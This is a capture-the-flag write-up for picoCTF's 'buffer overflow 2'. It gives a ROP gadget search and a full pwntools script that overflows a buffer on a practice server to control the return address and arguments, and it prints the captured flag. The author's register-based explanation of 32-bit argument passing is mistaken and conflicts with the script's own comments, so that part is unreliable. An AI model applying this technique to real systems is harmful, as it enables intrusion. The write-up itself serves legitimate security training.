# buffer overflow 2

### Description
> Control the return address and arguments

### Solution
I guess my solution is non-assumed solution.

After causing an overflow and overwrites the return address,
you have to set the value to the first and second arguments as shown below.

```
arg1 <- 0xCAFEF00D
arg2 <- 0xF00DF00D
```

`esi` register is the first argument and `edi` register is the second argument,
so you need to search `pop esi; pop edi; ret;` gadget.

Using the ropper,
```
$ropper -f vuln --search "pop esi; pop edi;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop esi; pop edi;

[INFO] File: vuln
0x08049451: pop esi; pop edi; pop ebp; ret;
```

Final solution

```python
from pwn import *

#file = "./vuln"
host = "saturn.picoctf.net"
port = 49940
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

pop_esi_edi_ebp = 0x08049451

io = remote(host, port)
#io = process(file)
pld = b"A"*112
pld += p32(0x08049296)
pld += p32(pop_esi_edi_ebp)
pld += p32(0xCAFEF00D) # edi
pld += p32(0xF00DF00D) # esi


io.sendlineafter("string:", pld)

io.interactive()
#picoCTF{argum3nt5_4_d4yZ_74abd092}
```
